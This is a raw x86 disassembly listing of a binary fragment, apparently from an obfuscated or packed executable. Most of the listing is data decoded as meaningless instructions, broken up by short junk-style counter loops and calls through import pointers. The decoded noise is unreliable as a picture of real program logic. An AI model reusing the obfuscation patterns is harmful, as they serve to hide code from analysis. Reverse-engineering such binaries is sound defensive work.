  40e14a:	mov    DWORD PTR ds:[ebp-0x5857dc56],ecx
  40e151:	cli    
  40e152:	add    dh,BYTE PTR [esp+ebp*2-0x31]
  40e156:	fnstcw WORD PTR ss:[eax-0x26]
  40e15a:	or     edx,edx
  40e15c:	scas   eax,DWORD PTR es:[edi]
  40e15d:	ja     0x40e148
  40e15f:	add    DWORD PTR [ebp-0x21],esi
  40e162:	jo     0x40e177
  40e164:	mov    al,ds:0xa102c27d
  40e169:	gs dec esp
  40e16b:	or     ah,BYTE PTR [ebx]
  40e16d:	push   ebp
  40e16e:	std    
  40e16f:	pop    edi
  40e170:	add    BYTE PTR [ebx],0x18
  40e173:	out    0x55,eax
  40e175:	popf   
  40e176:	xchg   BYTE PTR [eax+edi*2],ch
  40e179:	cmp    ebx,DWORD PTR [edx+0xa]
  40e17c:	adc    al,0x13
  40e17e:	add    DWORD PTR [edi-0x33],ebx
  40e181:	pop    esi
  40e182:	cmp    eax,DWORD PTR [eax-0x7b9f4e89]
  40e188:	js     0x40e1c5
  40e18a:	ror    DWORD PTR [esi+ebx*1],1
  40e18d:	das    
  40e18e:	mov    edi,0x3932bbaa
  40e193:	test   eax,0x3a85ab8e
  40e198:	sub    al,0xa6
  40e19a:	dec    edx
  40e19b:	cdq    
  40e19c:	xor    ebx,esp
  40e19e:	popf   
  40e19f:	jle    0x40e127
  40e1a1:	stc    
  40e1a2:	jo     0x40e144
  40e1a4:	push   0xffffffe1
  40e1a6:	or     DWORD PTR [ecx],ebx
  40e1a8:	xor    al,0xb
  40e1aa:	sbb    al,0xd
  40e1ac:	jae    0x40e181
  40e1ae:	push   0x47
  40e1b0:	and    DWORD PTR [edi+0x6c],0xffffffb3
  40e1b4:	cmc    
  40e1b5:	mov    bl,0x7b
  40e1b7:	cmp    ch,al
  40e1b9:	mov    bl,0xf
  40e1bb:	add    al,0x19
  40e1bd:	mov    esi,0x15dcdde
  40e1c2:	(bad)  
  40e1c3:	ret    
  40e1c4:	sar    ch,cl
  40e1c6:	fs inc edi
  40e1c8:	stc    
  40e1c9:	mov    dh,0xcc
  40e1cb:	jnp    0x40e19b
  40e1cd:	(bad)  
  40e1ce:	xchg   esp,eax
  40e1cf:	mov    eax,ds:0x5ea056fb
  40e1d4:	repz daa 
  40e1d6:	(bad)  
  40e1d7:	push   esp
  40e1d8:	fnsave [edx+0xb]
  40e1db:	or     edx,DWORD PTR [ebx-0x5e432dbe]
  40e1e1:	xor    eax,0x463a8786
  40e1e6:	pcmpgtd mm7,QWORD PTR [ecx]
  40e1e9:	xchg   edx,eax
  40e1ea:	adc    BYTE PTR [eax+0x66],bl
  40e1ed:	xchg   ebp,eax
  40e1ee:	fwait
  40e1ef:	jp     0x40e263
  40e1f1:	pop    esi
  40e1f2:	repnz xor ah,bh
  40e1f5:	dec    esi
  40e1f6:	jmp    0x40e205
  40e1f8:	and    edi,ebp
  40e1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1fb:	pop    ss
  40e1fc:	lea    ebx,ds:0x79f1b272
  40e202:	xor    ecx,DWORD PTR [esi-0x42e7a992]
  40e208:	rcr    edx,0x12
  40e20b:	addr16 leave 
  40e20d:	in     eax,dx
  40e20e:	aas    
  40e20f:	ss ds jo 0x40e271
  40e213:	adc    al,0x4f
  40e215:	adc    edx,DWORD PTR [ebp-0x5c87aeec]
  40e21b:	sar    cl,0x6a
  40e21e:	ja     0x40e232
  40e220:	dec    ecx
  40e221:	(bad)  
  40e222:	mov    DWORD PTR [ebp+0x42ee0c2d],0x81f0a3ac
  40e22c:	jmp    0x40e1bb
  40e22e:	and    eax,0x65c01bf9
  40e233:	ret    
  40e234:	cmp    bl,al
  40e236:	cmp    esp,eax
  40e238:	push   ds
  40e239:	and    al,0xe9
  40e23b:	add    al,0x66
  40e23d:	daa    
  40e23e:	add    BYTE PTR [eax+0x69],dl
  40e241:	aaa    
  40e242:	call   0xecf27433
  40e247:	push   esp
  40e248:	sbb    eax,0xf551d312
  40e24d:	jecxz  0x40e1e4
  40e24f:	cdq    
  40e250:	add    al,0x3f
  40e252:	inc    esp
  40e253:	jge    0x40e23f
  40e255:	jmp    0xc37c:0x55289ae
  40e25c:	push   ds
  40e25d:	and    BYTE PTR [edi+0x5],ch
  40e260:	stc    
  40e261:	mov    dl,0x11
  40e263:	mov    ebp,0x1fa52435
  40e268:	xor    eax,0xd66ff2a5
  40e26d:	cmp    eax,ebp
  40e26f:	or     eax,0xe559aaf3
  40e274:	lock lea ecx,[ecx+0x1899c18]
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	mov    al,ds:0x3b9f14d4
  40e37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e3ed
  40e383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e384:	mov    al,ds:0x1836fe
  40e389:	dec    ecx
  40e38a:	jge    0x40e406
  40e38c:	scas   eax,DWORD PTR es:[edi]
  40e38d:	inc    esi
  40e38e:	jns    0x40e380
  40e390:	and    eax,0x4bc73736
  40e395:	mov    WORD PTR [edx],ds
  40e397:	jb     0x40e320
  40e399:	imul   edx,DWORD PTR [ecx-0x34],0xfffffffb
  40e39d:	cmp    DWORD PTR [ecx+edx*8],edx
  40e3a0:	sub    dh,bh
  40e3a2:	inc    ecx
  40e3a3:	adc    al,BYTE PTR [esi+0x68]
  40e3a6:	call   0x36be873
  40e3ab:	mov    al,BYTE PTR [ebp+0x6a]
  40e3ae:	jns    0x40e418
  40e3b0:	inc    ecx
  40e3b1:	call   0xcdc2:0x4b8f717a
  40e3b8:	pop    esp
  40e3b9:	mov    eax,0x43981689
  40e3be:	add    BYTE PTR [ecx],ch
  40e3c0:	call   0x21892ce7
  40e3c5:	ret    
  40e3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c7:	sub    BYTE PTR [eax+ebp*4],al
  40e3ca:	into   
  40e3cb:	enter  0x9fbd,0x83
  40e3cf:	dec    edx
  40e3d0:	inc    esi
  40e3d1:	xchg   BYTE PTR [ebp-0x611eb03d],cl
  40e3d7:	test   eax,0xae7ca23b
  40e3dc:	outs   dx,BYTE PTR ds:[esi]
  40e3dd:	daa    
  40e3de:	mov    cl,0x15
  40e3e0:	xchg   ecx,eax
  40e3e1:	pop    ss
  40e3e2:	test   al,0x71
  40e3e4:	dec    ebp
  40e3e5:	retf   
  40e3e6:	cld    
  40e3e7:	sub    al,0x65
  40e3e9:	inc    ebp
  40e3ea:	pop    ebp
  40e3eb:	and    DWORD PTR [edi-0x4ec50f2d],edi
  40e3f1:	jno    0x40e3af
  40e3f3:	jnp    0x40e431
  40e3f5:	fwait
  40e3f6:	sbb    dh,BYTE PTR [ebp+0x1fc9851f]
  40e3fc:	adc    al,0xa4
  40e3fe:	push   ds
  40e3ff:	pop    ebx
  40e400:	xchg   esp,eax
  40e401:	es mov ch,al
  40e404:	dec    edx
  40e405:	jl     0x40e3fb
  40e407:	dec    ebx
  40e408:	fisub  WORD PTR [ebp-0x4f0da590]
  40e40e:	int3   
  40e40f:	or     BYTE PTR [ebp+0x3b],dl
  40e412:	ins    DWORD PTR es:[edi],dx
  40e413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e414:	into   
  40e415:	mov    edx,DWORD PTR fs:[esi-0x18]
  40e419:	jb     0x40e3bc
  40e41b:	sbb    esp,DWORD PTR [ebx-0x3b]
  40e41e:	shr    BYTE PTR [edx+0x6e],0xa
  40e422:	sbb    al,0xb5
  40e424:	fild   QWORD PTR [edx+0x7b]
  40e427:	mov    eax,0x1b562e51
  40e42c:	mov    ebx,0x9c80cd0b
  40e431:	in     eax,0xb2
  40e433:	shl    DWORD PTR [eax-0x2537455f],0xd5
  40e43a:	jb     0x40e3e7
  40e43c:	fld    QWORD PTR [esi+0x58]
  40e43f:	push   cs
  40e440:	and    al,0xf3
  40e442:	rol    DWORD PTR [ebx-0x70],0x51
  40e446:	(bad)  
  40e447:	mov    bh,0xae
  40e449:	nop
  40e44a:	imul   esp
  40e44c:	loop   0x40e43b
  40e44e:	int3   
  40e44f:	and    bh,ah
  40e451:	popa   
  40e452:	int3   
  40e453:	or     DWORD PTR [edx],ecx
  40e455:	cmp    DWORD PTR [edx],esi
  40e457:	repnz and BYTE PTR [esi+esi*1],0xca
  40e45c:	in     al,0x44
  40e45e:	cmp    ecx,DWORD PTR [edi-0x2a6ca106]
  40e464:	cmp    eax,0xe13c97b0
  40e469:	icebp  
  40e46a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e46b:	sub    DWORD PTR [eax-0xc],ebp
  40e46e:	inc    ebx
  40e46f:	dec    ecx
  40e470:	mov    bh,0x15
  40e472:	jno    0x40e437
  40e474:	mov    BYTE PTR [edx],cl
  40e476:	adc    al,0xf6
  40e478:	inc    esi
  40e479:	mov    eax,ds:0xab4c60e7
  40e47e:	and    ecx,DWORD PTR [ecx+0x12]
  40e481:	out    0x94,al
  40e483:	inc    BYTE PTR [esi+0x41]
  40e486:	out    0x16,al
  40e488:	rcr    BYTE PTR [esi],0xb
  40e48b:	and    BYTE PTR [ecx+0x34fe8d0a],ch
  40e491:	mov    dh,0x41
  40e493:	sbb    DWORD PTR [ebx],ebp
  40e495:	mov    bh,0xff
  40e497:	mov    DWORD PTR [ebp-0x2c8744b9],esi
  40e49d:	jmp    0x9828:0x6414943e
  40e4a4:	add    al,0xa8
  40e4a6:	iret   
  40e4a7:	loope  0x40e476
  40e4a9:	pushf  
  40e4aa:	pushf  
  40e4ab:	out    0xf0,eax
  40e4ad:	(bad)  
  40e4ae:	mov    dl,0x3e
  40e4b0:	pop    esp
  40e4b1:	(bad)  
  40e4b2:	loopne 0x40e508
  40e4b4:	adc    ecx,DWORD PTR [ecx]
  40e4b6:	leave  
  40e4b7:	mov    ebx,0x3536bb8a
  40e4bc:	mov    eax,0xbd641d91
  40e4c1:	outs   dx,BYTE PTR ds:[esi]
  40e4c2:	(bad)  
  40e4c4:	add    bl,BYTE PTR [ecx]
  40e4c6:	fxtract 
  40e4c8:	gs pop es
  40e4ca:	les    eax,FWORD PTR [ebp-0x38eebdb2]
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xec53740f
  40e4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4f6:	hlt    
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	push   eax
  40e500:	(bad)  
  40e501:	lock mul BYTE PTR [edi-0x33aa1d0d]
  40e508:	test   al,0x5b
  40e50a:	and    DWORD PTR [edi-0x16130348],edx
  40e510:	pop    esi
  40e511:	retf   0x4d05
  40e514:	into   
  40e515:	fsub   DWORD PTR [esp+ebx*8-0x2a57eb7b]
  40e51c:	sub    ah,bl
  40e51e:	idiv   BYTE PTR [esi+0x28]
  40e521:	fs repnz adc eax,0xaa1d33e0
  40e528:	outs   dx,DWORD PTR ds:[esi]
  40e529:	jae    0x40e57c
  40e52b:	les    esp,FWORD PTR [ecx-0x6b]
  40e52e:	addr16 aaa 
  40e530:	push   ebp
  40e531:	repnz pop edi
  40e533:	leave  
  40e534:	cmc    
  40e535:	jmp    0x19ef:0x8258a0b8
  40e53c:	fsubr  QWORD PTR [edx+eax*2-0x7c]
  40e540:	enter  0x3bc5,0xde
  40e544:	adc    al,0xd9
  40e546:	loop   0x40e55a
  40e548:	aaa    
  40e549:	inc    ebx
  40e54a:	out    dx,al
  40e54b:	gs xchg ecx,eax
  40e54d:	in     eax,0xc7
  40e54f:	es dec ecx
  40e551:	mov    WORD PTR [edi+0x5e7ca882],ds
  40e557:	sar    DWORD PTR [eax-0x3f],1
  40e55a:	push   edx
  40e55b:	mov    al,ds:0x52465fd
  40e560:	add    al,0x12
  40e562:	std    
  40e563:	mov    ebx,0xc100f080
  40e568:	(bad)  
  40e56a:	dec    ecx
  40e56b:	jnp    0x40e50f
  40e56d:	in     al,0x97
  40e56f:	cmp    eax,0x52b24597
  40e574:	not    BYTE PTR [esi+0x1dd891c5]
  40e57a:	je     0x40e5af
  40e57c:	or     eax,0xf47aa2b2
  40e581:	xor    al,0xb0
  40e583:	inc    edi
  40e584:	xchg   si,ax
  40e586:	test   eax,0x461d3eaa
  40e58b:	out    0x5d,al
  40e58d:	inc    eax
  40e58e:	xchg   ebp,eax
  40e58f:	sti    
  40e590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e591:	jl     0x40e5e5
  40e593:	jl     0x40e5a1
  40e595:	jbe    0x40e611
  40e597:	pop    ss
  40e598:	push   edi
  40e599:	sbb    al,0x87
  40e59b:	dec    eax
  40e59c:	call   0xb996:0x26ea70e7
  40e5a3:	sub    al,0x24
  40e5a5:	stc    
  40e5a6:	aas    
  40e5a7:	int    0x4e
  40e5a9:	pop    eax
  40e5aa:	into   
  40e5ab:	jp     0x40e53d
  40e5ad:	xchg   DWORD PTR [edx+0x79],ebp
  40e5b0:	add    esi,edi
  40e5b2:	sbb    eax,0x8fdbaaf8
  40e5b7:	sub    eax,edi
  40e5b9:	pusha  
  40e5ba:	adc    eax,0xa3e51a46
  40e5bf:	cmp    eax,0xc081e6c0
  40e5c4:	(bad)  [eax+eiz*8]
  40e5c7:	clc    
  40e5c8:	rcl    DWORD PTR [edi+0x2d],1
  40e5cb:	cld    
  40e5cc:	mov    WORD PTR [edi+ebx*8-0x51],ss
  40e5d0:	mov    ch,0x7a
  40e5d2:	lock pop ss
  40e5d4:	adc    BYTE PTR [ebx+0x5],bh
  40e5d7:	and    eax,0xff0d3c90
  40e5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5dd:	lds    ebx,FWORD PTR [eax-0x7354c382]
  40e5e3:	dec    edx
  40e5e4:	inc    eax
  40e5e5:	jecxz  0x40e584
  40e5e7:	jbe    0x40e645
  40e5e9:	ss inc ecx
  40e5eb:	adc    DWORD PTR [ebx+ebx*8],0x1ab82571
  40e5f2:	outs   dx,BYTE PTR ds:[esi]
  40e5f3:	push   edi
  40e5f4:	rcl    BYTE PTR [edx],0xf
  40e5f7:	add    al,0xfc
  40e5f9:	xchg   edx,eax
  40e5fa:	sub    dl,BYTE PTR [esi-0x24ed6fe]
  40e600:	dec    esi
  40e601:	jle    0x40e5fc
  40e603:	outs   dx,DWORD PTR ds:[esi]
  40e604:	mov    WORD PTR ds:[edx+0x65],?
  40e608:	imul   eax,DWORD PTR [edi-0x75227332],0xffffffe1
  40e60f:	loope  0x40e649
  40e611:	sub    bh,BYTE PTR [ecx+0x52]
  40e614:	inc    edx
  40e615:	loope  0x40e5d8
  40e617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e618:	popa   
  40e619:	sub    eax,0xbaa77e95
  40e61e:	mov    ebx,0x9a5e4c9e
  40e623:	sahf   
  40e624:	inc    edx
  40e625:	fcomp  DWORD PTR [edi+eax*2]
  40e628:	mov    dh,0xa0
  40e62a:	arpl   WORD PTR [ecx],bx
  40e62c:	dec    ebx
  40e62d:	cmc    
  40e62e:	sub    DWORD PTR [edi],esp
  40e630:	dec    BYTE PTR ds:0xf141623
  40e636:	adc    al,0xab
  40e638:	add    eax,0x229ab8ce
  40e63d:	ror    DWORD PTR [esi],0x19
  40e640:	mov    bl,0xf7
  40e642:	jmp    0x40e62b
  40e644:	daa    
  40e645:	shl    BYTE PTR [ebp-0x1e],1
  40e648:	(bad)  
  40e649:	int    0xb4
  40e64b:	mov    bl,0x8b
  40e64d:	inc    ebp
  40e64e:	call   0xfdbb0bd4
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	mov    WORD PTR [ebp+eiz*4+0x70a25185],?
  40e6e1:	jo     0x40e6a6
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e732
  40e6e7:	cmp    BYTE PTR [esi+0x445868f7],0x64
  40e6ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ef:	cmp    eax,0x23b8803e
  40e6f4:	imul   esi,DWORD PTR [edi+0x2e857087],0x2334281
  40e6fe:	shl    DWORD PTR [ecx+ecx*4],cl
  40e701:	xchg   ebx,eax
  40e702:	mov    ds:0x2eda7219,al
  40e707:	pusha  
  40e708:	sbb    eax,0x4b2ff882
  40e70d:	push   ecx
  40e70e:	popa   
  40e70f:	xor    DWORD PTR [ebx-0xd995a69],0x14
  40e716:	xchg   esp,eax
  40e717:	jno    0x40e6ff
  40e719:	mov    al,ds:0x2b07aaa4
  40e71e:	pusha  
  40e71f:	sahf   
  40e720:	dec    eax
  40e721:	inc    esi
  40e722:	fmul   DWORD PTR [eax+edx*1]
  40e725:	cdq    
  40e726:	and    DWORD PTR [edi+0x20],ecx
  40e729:	je     0x40e7a3
  40e72b:	retf   
  40e72c:	out    dx,eax
  40e72d:	pop    ebp
  40e72e:	popa   
  40e72f:	jmp    0x98429408
  40e734:	push   ebx
  40e735:	nop
  40e736:	es sti 
  40e738:	or     eax,0xdc49cb97
  40e73d:	mov    edx,0x1ae878f1
  40e742:	ret    0x4fe7
  40e745:	idiv   BYTE PTR [ebx]
  40e747:	icebp  
  40e748:	test   al,0xed
  40e74a:	arpl   WORD PTR [ebp+0x6f],cx
  40e74d:	sbb    DWORD PTR [ebx-0x66],ebx
  40e750:	hlt    
  40e751:	into   
  40e752:	outs   dx,DWORD PTR ds:[esi]
  40e753:	daa    
  40e754:	pop    ebx
  40e755:	mov    DWORD PTR ds:0x85d5c6c2,esi
  40e75b:	push   0xffffffe7
  40e75d:	xchg   ebp,eax
  40e75e:	pop    ecx
  40e75f:	arpl   WORD PTR [eax+0x67],bx
  40e762:	outs   dx,BYTE PTR ds:[esi]
  40e763:	adc    al,0x42
  40e765:	jbe    0x40e7b0
  40e767:	xchg   BYTE PTR [ebx-0x48728968],cl
  40e76d:	sbb    ecx,DWORD PTR ds:0x1b039d4a
  40e773:	cmc    
  40e774:	js     0x40e71b
  40e776:	sti    
  40e777:	imul   edx,ecx,0xa75c983d
  40e77d:	(bad)  
  40e77e:	in     eax,dx
  40e77f:	sete   BYTE PTR [esi]
  40e782:	test   eax,0x1f55acc0
  40e787:	jb     0x40e7f4
  40e789:	cmp    eax,ebp
  40e78b:	ja     0x40e77a
  40e78d:	jne    0x40e802
  40e78f:	out    0x6c,al
  40e791:	push   es
  40e792:	fistp  DWORD PTR [ebx-0x2f]
  40e795:	gs dec edx
  40e797:	popf   
  40e798:	and    eax,0x138509a6
  40e79d:	add    al,0xf2
  40e79f:	retf   
  40e7a0:	into   
  40e7a1:	aad    0x1a
  40e7a3:	mov    WORD PTR [ebx-0x52d6f94a],ss
  40e7a9:	or     al,0x1
  40e7ab:	stc    
  40e7ac:	scas   al,BYTE PTR es:[edi]
  40e7ad:	sbb    eax,0xefc7e0c5
  40e7b2:	push   0xffffffec
  40e7b4:	or     cl,BYTE PTR [ebx+0xb]
  40e7b7:	pop    es
  40e7b8:	daa    
  40e7b9:	fsub   QWORD PTR [edx+0x22]
  40e7bc:	ret    0x525b
  40e7bf:	fistp  QWORD PTR [ebx]
  40e7c1:	pop    ebx
  40e7c2:	xchg   edx,eax
  40e7c3:	push   ds
  40e7c4:	pop    esp
  40e7c5:	push   esp
  40e7c6:	xchg   edi,eax
  40e7c7:	cwde   
  40e7c8:	mov    ds:0x64564bfb,al
  40e7cd:	leave  
  40e7ce:	jns    0x40e7af
  40e7d0:	ss inc esi
  40e7d2:	out    0xc,al
  40e7d4:	(bad)  
  40e7d5:	les    ebp,FWORD PTR [edi+0x79224202]
  40e7db:	out    dx,al
  40e7dc:	sar    BYTE PTR [ebp-0xa],0x1
  40e7e0:	sti    
  40e7e1:	ja     0x40e83b
  40e7e3:	stos   DWORD PTR es:[edi],eax
  40e7e4:	mov    ecx,DWORD PTR [edx-0x28de1db1]
  40e7ea:	mov    ch,0x89
  40e7ec:	mov    bh,BYTE PTR [edi]
  40e7ee:	loop   0x40e830
  40e7f0:	imul   ebp,DWORD PTR [edx-0x3d],0x37
  40e7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f5:	mov    esi,DWORD PTR [ebx]
  40e7f7:	mov    WORD PTR [ebx],ss
  40e7f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fa:	lods   al,BYTE PTR ds:[esi]
  40e7fb:	and    eax,0xa9f38b5d
  40e800:	jl     0x40e837
  40e802:	pop    eax
  40e803:	and    bl,BYTE PTR [ebx]
  40e805:	cmp    bh,BYTE PTR [ecx-0x1f]
  40e808:	mov    ebx,0x766d0cac
  40e80d:	(bad)  
  40e80f:	or     BYTE PTR [esi+0x58],0x9c
  40e813:	ja     0x40e835
  40e815:	push   es
  40e816:	sbb    eax,0x15688bda
  40e81b:	adc    ebx,DWORD PTR [esi]
  40e81d:	or     edi,esp
  40e81f:	int    0x30
  40e821:	ins    DWORD PTR es:[edi],dx
  40e822:	ss sti 
  40e824:	fldcw  WORD PTR [edi+edx*8-0x49]
  40e828:	call   DWORD PTR [esi+0x376787f]
  40e82e:	ror    BYTE PTR [edi],1
  40e830:	loopne 0x40e7f1
  40e832:	sbb    cl,BYTE PTR [ebx-0x16ea7f00]
  40e838:	cld    
  40e839:	inc    edx
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	pusha  
  40e94a:	lods   eax,DWORD PTR ds:[esi]
  40e94b:	int    0xe4
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e956
  40e956:	mov    eax,ds:0xf7a20d05
  40e95b:	inc    ebx
  40e95c:	sahf   
  40e95d:	add    eax,0x311c7d18
  40e962:	add    DWORD PTR [ebp-0x5cee69bb],ebx
  40e968:	call   0x9ee6a32b
  40e96d:	sahf   
  40e96e:	cmp    eax,0xbaeb8988
  40e973:	int    0x59
  40e975:	out    dx,al
  40e976:	cmp    eax,0x193a78c4
  40e97b:	in     eax,0x6f
  40e97d:	sahf   
  40e97e:	setnp  BYTE PTR [ebx+eax*8+0x29]
  40e983:	push   ebx
  40e984:	cdq    
  40e985:	xchg   ecx,eax
  40e986:	jmp    0x4b988e35
  40e98b:	cdq    
  40e98c:	(bad)  
  40e98d:	clc    
  40e98e:	or     BYTE PTR [edi],cl
  40e990:	ficom  DWORD PTR [esi+eiz*4-0x18]
  40e994:	and    al,0x54
  40e996:	dec    ecx
  40e997:	pop    esp
